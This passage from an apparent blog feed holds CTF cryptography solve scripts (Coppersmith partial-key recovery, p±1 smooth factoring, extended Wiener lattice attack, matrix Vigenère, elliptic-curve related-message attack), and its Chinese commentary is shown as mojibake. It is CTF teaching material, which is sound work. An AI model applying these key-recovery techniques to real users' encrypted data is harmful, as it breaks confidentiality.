escape_">\x</span>c8e~fL<span class="hljs-char escape_">\x</span>cf<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>d6^s-<span class="hljs-char escape_">\x</span>c9<span class="hljs-char escape_">\x</span>d6M&quot;</span><br>print(cipher.decrypt(ct))<br></code></pre></td></tr></table></figure><h2 id="easy-high">easy_high</h2><p>è€ƒç‚¹ï¼š</p><ol><li>å¼‚æˆ–</li><li>å·²çŸ¥pçš„éƒ¨åˆ†æ¯”ç‰¹çš„coppersmithæ”»å‡»</li></ol><p>å‚è€ƒå­¦ä¹ coppersmithæ”»å‡»çš„ç»å…¸åº”ç”¨ï¼šå·²çŸ¥pçš„éƒ¨åˆ†æ¯”ç‰¹ï¼Œå·²çŸ¥éƒ¨åˆ†æ˜æ–‡ï¼Œå·²çŸ¥éƒ¨åˆ†ç§é’¥ä½ä½ç­‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">p0=<span class="hljs-number">149263925308155304734002881595820602641174737629551638146384199378753884153459661375931646716325020758837194837271581361322079811468970876532640273110966545339040194118880506352109559900553776706613338890047890747811129988585025948270181264314668772556874718178868209009192010129918138140332707080927643141811</span><br><br>p1=p0%(<span class="hljs-number">2</span>**<span class="hljs-number">444</span>)  <span class="hljs-comment">#ä½ä½</span><br>b=p0.bit_length()-<span class="hljs-number">250</span><br>p2=(p0&gt;&gt;b)&lt;&lt;b<br>N=<span class="hljs-number">17192509201635459965397076685948071839556595198733884616568925970608227408244870123644193452116734188924766414178232653941867668088060274364830452998991993756231372252367134508712447410029668020439498980619263308413952840568602285764163331028384281840387206878673090608323292785024372223569438874557728414737773416206032540038861064700108597448191546413236875600906013508022023794395360001242071569785940215873854748631691555516626235191098174739613181230094797844414203694879874212340812119576042962565179579136753839946922829803044355134086779223242080575811804564731938746051591474236147749401914216734714709281349</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">PR.&lt; x &gt; = PolynomialRing(Zmod(N))</span><br><span class="hljs-string">f = p1+p2+x*2^444</span><br><span class="hljs-string">f=f.monic()</span><br><span class="hljs-string">x0 = f.small_roots(X=2 ^ 340, beta=0.4)[0]</span><br><span class="hljs-string">print(x0)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>x0=<span class="hljs-number">1414640121010865756473118885903739629697184780736973873076436168814438323477468170166972852648894898</span><br>p=p1+p2+x0*<span class="hljs-number">2</span>**<span class="hljs-number">444</span><br>q=N//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>d=invert(<span class="hljs-number">65537</span>,phi)<br>c=<span class="hljs-number">4881545863615247924697512170011400857004555681758106351259776881249360423774694437921554056529064037535796844084045263140567168171628832384672612945806728465127954937293787045302307135365408938448006548465000663247116917564500525499976139556325841597810084111303039525833367199565266613007333465332710833102978756654324956219855687611590278570749890543277201538208370370097424105751568285050703167350889953331829275262932104042040526209179357770495596739361176548337593674366015027648541293309465113202672923556991818236011769228078267484362980348613669012975963468592763463397575879215173972436831753615524193609612</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,N)))<br></code></pre></td></tr></table></figure><h2 id="eZ-LargeCG">eZ_LargeCG</h2><p>è€ƒç‚¹</p><ol><li><p>p+1å…‰æ»‘</p></li><li><p>p-1å…‰æ»‘</p></li><li><p>çº¿æ€§é€’æ¨-&gt;çŸ©é˜µå¿«é€Ÿå¹‚</p></li></ol><p>å¯ä»¥å‚è€ƒ<a href="http://striving.mapleice.top/index.php/archives/141/%E7%AC%AC%E5%9B%9B%E9%A2%98%E5%AD%A6%E4%B9%A0">http://striving.mapleice.top/index.php/archives/141/ç¬¬å››é¢˜å­¦ä¹ </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#p-1å…‰æ»‘</span><br><span class="hljs-string">python primefac -vs -m=p-1 xxx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p=<span class="hljs-number">427721675251610827084310512123962488210068003845592404231631542730839819224381</span><br>n1=<span class="hljs-number">39755206609675677517559022219519767646524455449142889144073217274247893104711318356648198334858966762944109142752432641040037415587397244438634301062818169</span><br>q=n1//p<br>q1=<span class="hljs-built_in">max</span>(p,q)<br>p1=<span class="hljs-built_in">min</span>(p,q)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#p+1å…‰æ»‘</span><br><span class="hljs-string">python primefac -vs -m=p+1 xxx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p=<span class="hljs-number">106481130516780473105954611077340189174861459077145246394800660809527032990637</span><br>q=<span class="hljs-number">288551157776490110472645044398395422160196115791981535735903775378294599329633</span><br>q2=<span class="hljs-built_in">max</span>(p,q)<br>p2=<span class="hljs-built_in">min</span>(p,q)<br><br><span class="hljs-comment">#çº¿æ€§é€’æ¨ å¿«é€Ÿå¹‚</span><br>r = <span class="hljs-number">7948275435515074902473978567170931671982245044864706132834233483354166398627204583162848756424199888842910697874390403881343013872330344844971750121043493</span><br>A = <span class="hljs-number">6085327340671394838391386566774092636784105046872311226269065664501131836034666722102264842236327898770287752026397099940098916322051606027565395747098434</span><br>B = <span class="hljs-number">1385551782355619987198268805270109182589006873371541520953112424858566073422289235930944613836387546298080386848159955053303343649615385527645536504580787</span><br>C = <span class="hljs-number">2529291156468264643335767070801583140819639532551726975314270127875306069067016825677707064451364791677536138503947465612206191051563106705150921639560469</span><br><br>a,b,c,d=p1,q1,p2,q2<br>M=matrix(Zmod(r),[[c,b,a,<span class="hljs-number">1</span>],<br>                  [<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],<br>                  [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],<br>                  [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]])<br>N=matrix(Zmod(r),[[C,B,A,d]])<br>N=N.T<br>nn=<span class="hljs-number">6</span>**<span class="hljs-number">666</span><br>M=M^nn<br><span class="hljs-built_in">print</span>(M^-<span class="hljs-number">1</span>*N)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-number">718268686893438084080386300782696916434605242000201123193568557324202508308322958959518435405441886593296740</span>-<span class="hljs-number">2023</span>))<br></code></pre></td></tr></table></figure><h2 id="complex-matrix">complex_matrix</h2><p>è€ƒç‚¹ï¼š</p><ol><li>æ‰©å±•ç»´çº³æ”»å‡»ï¼ˆå››ç»´ï¼‰</li></ol><p>å¯ä»¥å‚è€ƒ<a href="https://huangx607087.online/2021/03/01/LatticeNotes6/%E5%AD%A6%E4%B9%A0">https://huangx607087.online/2021/03/01/LatticeNotes6/å­¦ä¹ </a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">71841248095369087024928175623295380241516644434969868335504061065977014103487197287619667598363486210886674500469383623511906399909335989202774281795855975972913438448899231650449810696539722877903606541112937729384851506921675290984316325565141178015123381439392534417225128922398194700511937668809140024838070124095703585627058463137549632965723304713166804084673075651182998654091113119667582720831809458721072371364839503563819080226784026253</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">39297018404565022956251803918747154798377576057123078716166221329195959669756819453426741569480551313085435037629493881038383709458043802420338889323233368852331387845200216275712388921820794980987541224782392553528127093154957890356084331463340193478391679540506421250562554424770350351514435220782124981277580072039637811543914983033300225131364246910828188727043248991987332274929827173923543187017105236008487756190002204169623313222748976369</span><br>e1, e2, e3, e4 = (<br><span class="hljs-number">65128799196671634905309494529154568614228788035735808211836905142007976099865571126946706559109393187772126407982007858423859147772762638898854472065889939549916077695303157760259717113616428849798058080633047516455513870697383339784816006154279428812359241282979297285283850338964993773227397528608557211742425548651971558377656644211835094019462699301650412862894391885325969143805924684662849869947172175608502179438901337558870349697233790535</span>,<br><span class="hljs-number">58756559706647121529575085912021603170286163639572075337348109911506627489265537716060463072086480156516641723700802217411122982693536541892986623158818442274840863016647800896033363360822503445344748132842451806511693779600370832206455202293028402486647422212959763287987847280322100701242139127654031151565924132562837893975505159702015125483479126108892709063135006366792197127007229210558758401679638300464111782814561428899998471531067163715</span>,<br><span class="hljs-number">34828685390969672139784723764579499920301439564705391196519314224159563070870933754477650614819514127121146216049444888554338415587165719098661141454627820126445291802801256297252654045398330613075575527685542980264993711077876535643646746742646371967302159565887123638001580042027272379341650995728849759541960087953160211696369079708787543303742132161742979856720539914370868829868891655221361545648778590685232034703220732697083024449894197969</span>,<br><span class="hljs-number">26717968456600556973167180286909817773394160817933525240720067057464671317174201540556176814203780603153696663101158205367554829261808020426363683474848952397963507069306452835776851274959389849223566030857588019845781623271395012194869024566879791449466064832273531795430185178486425688475688634844530106740480643866537205900809400383304665727460014210405339697947582657505028211149470787536144302545259243549176816653560626044921521516818788487</span>)<br><br>A = [<br>    [<span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">4</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -n, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n, n ^ <span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">2</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n, n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, -n, n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, -n, n ^ <span class="hljs-number">2</span>, -n, n ^ <span class="hljs-number">2</span>, n ^ <span class="hljs-number">2</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -n, <span class="hljs-number">0</span>, -n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, -n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]]<br>Q = [n ^ <span class="hljs-number">2</span>, n ^ <span class="hljs-number">1.5</span>, n ^ <span class="hljs-number">2.4</span>, n, n ^ <span class="hljs-number">2.4</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">0.5</span>, n ^ <span class="hljs-number">2.4</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">1.9</span>, n ^ <span class="hljs-number">1.4</span>, n ^ <span class="hljs-number">1.9</span>,<br>     n ^ <span class="hljs-number">1.4</span>, n ^ <span class="hljs-number">1.4</span>, <span class="hljs-number">1</span>]<br>P = [<span class="hljs-number">1</span>, e1, e2, e1 * e2, e3, e1 * e3, e2 * e3, e1 * e2 * e3, e4, e1 * e4, e2 * e4, e1 * e2 * e4, e3 * e4, e1 * e3 * e4,<br>     e2 * e3 * e4, e1 * e2 * e3 * e4]<br>A, P, Q = matrix(ZZ, A), diagonal_matrix(ZZ, P), diagonal_matrix(ZZ, Q)<br>A = P * A * Q<br>w = vector(ZZ, A.LLL()[<span class="hljs-number">0</span>])<br>v = w * A ^ (-<span class="hljs-number">1</span>)<br>phi = <span class="hljs-built_in">int</span>(e1 * v[<span class="hljs-number">1</span>] // v[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(phi))<br>d = inverse(e, phi)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c, d, n)))<br></code></pre></td></tr></table></figure><h2 id="baby-classical">baby_classical</h2><p>çœ‹ç€å¤æ‚ï¼ŒæŠŠé¢˜ç›®å‡½æ•°éƒ½ç†ä¸€éï¼Œå…¶å®å°±ä¸€ä¸ªçŸ©é˜µè¿ç®—ï¼Œç±»ç»´å‰å°¼äºšåŠ å¯†</p><p>è€ƒç‚¹ï¼š</p><ol><li>python</li><li>çŸ©é˜µè¿ç®—</li><li>ç»´å‰å°¼äºšåŠ å¯†</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><br>dic = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;+/&#x27;</span> <span class="hljs-comment">#å¤§å†™å°å†™+/</span><br>f1nd = <span class="hljs-keyword">lambda</span> x: dic.find(x)<br><br>enc_key=<span class="hljs-string">&#x27;pVvRe/G08rLhfwa&#x27;</span><br><br>res=[f1nd(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc_key]<br>res=[res[i:i+<span class="hljs-number">3</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(res),<span class="hljs-number">3</span>)]<br><span class="hljs-built_in">print</span>(res)<br>K= matrix(Zmod(<span class="hljs-number">64</span>),[[<span class="hljs-number">13</span> ,<span class="hljs-number">37</span> ,<span class="hljs-number">10</span>],<br> [<span class="hljs-number">15</span> ,<span class="hljs-number">17</span> ,<span class="hljs-number">41</span>],<br> [<span class="hljs-number">13</span>  ,<span class="hljs-number">0</span> ,<span class="hljs-number">10</span>]])<br>long=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:<br>    r=matrix(Zmod(<span class="hljs-number">64</span>),[i])<br>    l=r*K^-<span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(l)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> l[<span class="hljs-number">0</span>]:<br>        long.append(<span class="hljs-built_in">int</span>(j))<br><span class="hljs-built_in">print</span>(long)<br>dicn2s=&#123;i: dic[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)&#125;<br>dics2n = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(dicn2s.values(), dicn2s.keys()))<br><span class="hljs-built_in">print</span>(dics2n)<br>key=<span class="hljs-string">&#x27;&#x27;</span>.join([dicn2s[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> long])[:-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(key) <span class="hljs-comment">#W3ar3N0wayBack</span><br><br>c=<span class="hljs-string">&#x27;1k2Pe&#123;24seBl4_a6Ot_fp7O1_eHk_Plg3EF_g/JtIonut4/&#125;&#x27;</span><br>c=c.replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27; &#x27;</span>)<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i  <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> dic:<br>        flag+=dic[ (f1nd(i)-f1nd(key[j%<span class="hljs-built_in">len</span>(key)]) )%<span class="hljs-number">64</span> ]<br>    <span class="hljs-keyword">else</span>:<br>        flag+=i<br>    j+=<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(flag)<br>flag=flag.replace(<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>).replace(<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>).split(<span class="hljs-string">&#x27;_&#x27;</span>)<br>flag=<span class="hljs-string">&#x27;_&#x27;</span>.join([i[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag])<br><span class="hljs-built_in">print</span>(flag.swapcase())<br><span class="hljs-comment">#NKCTF&#123;ClaSsic_c0de_d0l1s_aRe_r3a1ly_int3reSting&#125;</span><br></code></pre></td></tr></table></figure><h1 id="N1CTFæ‹›æ–°èµ›">N1CTFæ‹›æ–°èµ›</h1><h2 id="ezezez">ezezez</h2><p>çŸ¥è¯†ç‚¹ï¼šæ¤­åœ†æ›²çº¿ï¼Œæ•°è®ºï¼ŒRelated Message Attack</p><p>è¯­è¨€ï¼šsagemath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a = <span class="hljs-number">259416965926853287275013962386631097709</span><br>n = <span class="hljs-number">8963244108103857378610478915798540027754205184635651624801332901515870452435977078824267979279218575027152343028911705254378598817260939339516835322386427</span><br>gy = [<span class="hljs-number">1896722249337161391193797083807118705857637064141055866260977430130447249097804719101078827699386498665026965515554644281163046869672493999194358926022865</span>, <span class="hljs-number">1971472878970365404484102034878792535366624572891039926216530789642810299559238977732710681752685090332485586910206690093655977703795335533365202958013518</span>, <span class="hljs-number">4074555112002157403114317690671003025383051142150876016519408756236925988856478235258960189636836867363451314784889114354880607055705753428890566240606935</span>]<br><span class="hljs-comment">#y^2=x^3+ax+b mod n</span><br>magic = bytes_to_long(<span class="hljs-string">b&#x27;N1Junior_CheckIn&#x27;</span>)<br>e=<span class="hljs-number">24</span><br>gx1=magic<br>b=(gy[<span class="hljs-number">1</span>]*gy[<span class="hljs-number">1</span>]-gx1*gx1*gx1-a*gx1)%n <span class="hljs-comment">#æ±‚å‡ºb</span><br><br><span class="hljs-comment">#fx=y0^2-(x^e)^3-a(x^e)-b</span><br><span class="hljs-comment">#gx=y2^2-((x+magic)^e)^3-a( (x+magic)^e )-b</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gcd</span>(<span class="hljs-params">g1, g2</span>):<br>    <span class="hljs-keyword">while</span> g2:<br>        g1, g2 = g2, g1 % g2<br>    <span class="hljs-keyword">return</span> g1.monic()<br>PR.&lt;x&gt;=PolynomialRing(Zmod(n))<br>fx=gy[<span class="hljs-number">0</span>]*gy[<span class="hljs-number">0</span>]-x^(<span class="hljs-number">3</span>*e)-a*x^e-b<br>gx=gy[<span class="hljs-number">2</span>]*gy[<span class="hljs-number">2</span>]-(x+magic)^(<span class="hljs-number">3</span>*e)-a*((x+magic)^e)-b<br><span class="hljs-built_in">print</span>(gcd(fx,gx))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>vpsæ­å»ºè‡ªç”¨èŠ‚ç‚¹</title>
    <link href="/2023/11/02/vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/"/>
    <url>/2023/11/02/vps%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E8%8A%82%E7%82%B9/</url>
    
